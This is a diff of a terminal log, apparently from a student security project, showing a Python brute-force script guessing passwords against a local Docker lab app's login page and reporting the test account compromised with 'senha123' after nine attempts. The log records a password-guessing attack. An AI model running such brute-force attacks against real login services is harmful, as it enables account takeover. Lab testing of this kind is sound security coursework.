@@ -1,11 +1,12 @@
-PS C:\Users\oandr\Documentos computador\t_final_segurança> docker exec -w /proj app_segura python ataque/brute_force.py --url http://host.docker.internal:5000 --usuario alvo --wordlist ataque/wordlist.txt
+$ docker exec -w /proj app_segura python ataque/brute_force.py --url http://host.docker.internal:5000 --usuario alvo --wordlist ataque/wordlist.txt --csv evidencias/ataque_vuln_bruteforce.csv
+# executado: 2026-11-16T11:03:42-03:00 | origem: docker (container app_segura) | Python 3.12.16 (linux)
 
 ================================================================
 ATAQUE DE FORCA BRUTA
-Alvo        : http://127.0.0.1:5000/login
+Alvo        : http://host.docker.internal:5000/login
 Usuario     : alvo
 Senhas testar: 12
-Inicio      : 2026-11-14 19:02:13
+Inicio      : 2026-11-16 14:03:42
 ================================================================
 [01] senha='123456' -> FALHA (HTTP 200)
 [02] senha='password' -> FALHA (HTTP 200)
@@ -19,5 +20,6 @@ Inicio      : 2026-11-14 19:02:13
 ================================================================
 RESULTADO   : COMPROMETIDO com a senha 'senha123'
 Tentativas  : 9
-Duracao     : 0.29s
+Duracao     : 0.08s
 ================================================================
+[csv por tentativa salvo em evidencias/ataque_vuln_bruteforce.csv]
